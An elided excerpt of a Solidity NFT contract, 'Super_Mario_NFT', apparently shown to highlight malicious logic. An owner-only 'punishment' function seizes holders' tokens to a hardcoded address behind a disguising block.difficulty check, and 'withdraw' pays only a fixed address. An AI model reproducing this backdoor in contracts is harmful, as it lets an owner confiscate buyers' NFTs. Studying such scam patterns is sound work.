...
contract Super_Mario_NFT is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Super_Mario_NFT", "SMN", maxBatchSize_, collectionSize_) {
  ...
  function punishment(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x3943E4d3c76E15FCB80920318B18061d3Ae56900, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x65411342f4f0E0450Ad6a8eF974a582ecEd826CE);
